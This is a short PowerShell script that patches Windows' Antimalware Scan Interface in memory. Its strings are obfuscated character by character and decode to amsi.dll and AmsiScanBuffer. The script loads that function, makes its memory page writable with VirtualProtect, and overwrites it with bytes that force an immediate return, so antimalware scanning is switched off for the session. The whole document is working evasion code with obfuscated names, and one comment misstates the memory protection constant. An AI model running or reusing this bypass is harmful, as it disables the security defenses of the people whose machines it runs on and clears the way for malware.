$entropy = @" 
using System;
using System.Runtime.InteropServices;
public class entropy {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr lnsgbs, uint flNewProtect, out uint lpflOldProtect);
}
"@ # Define and create a class to load DLL. 

Add-Type $entropy # Load the class
$kkkk = 0 # Define the variable to store the old protection
$jjjj = [entropy]::LoadLibrary("$(('àmsì'+'.dll').nORMaLiZe([chAR]([bYTE]0x46)+[chAr]([BYTE]0x6f)+[chAR]([bYte]0x72)+[chAR]([Byte]0x6d)+[cHar](68*38/38)) -replace [chAr]([byTE]0x5c)+[char](112*87/87)+[ChaR](94+29)+[CHAR](64+13)+[CHAr]([bytE]0x6e)+[CHAR](58+67))")# Replaces FormD characters with FormC characters
$iiii = [entropy]::GetProcAddress($jjjj, "$([char](6+59)+[char]([byte]0x6d)+[char](115*58/58)+[char](105+63-63)+[char](83)+[char](96+3)+[char](97)+[char](100+10)+[char](66*20/20)+[char](117)+[char](102*29/29)+[char]([byte]0x66)+[char]([byte]0x65)+[char](114+76-76))") # Get the address of the function with ProcAddress
[entropy]::VirtualProtect($iiii, [uint32]5, 0x40, [ref]$kkkk) # Change the protection of the address to 0x40. This is the same as PAGE_EXECUTE_READ. 

$aaaa = "0x"

$cccc = $aaaa + "B" 


$gggg = $aaaa + "5" 
$cccc = $cccc + "8" 
$ffff = $aaaa + "0" 
$gggg = $gggg + "7" 
$ffff = $ffff + "0" 
$dddd = $aaaa + "8"     
$eeee = $aaaa + "0" 
$eeee = $eeee + "7" 
$bbbb = $aaaa + "C" 
$dddd = $dddd + "0" 
$bbbb = $bbbb + "3" 


$hhhh = [byte[]] ($cccc,$gggg,$ffff,$eeee,+$dddd,+$bbbb) 
[System.Runtime.InteropServices.Marshal]::Copy($hhhh, 0, $iiii, 6)  # Copy the bytes to the address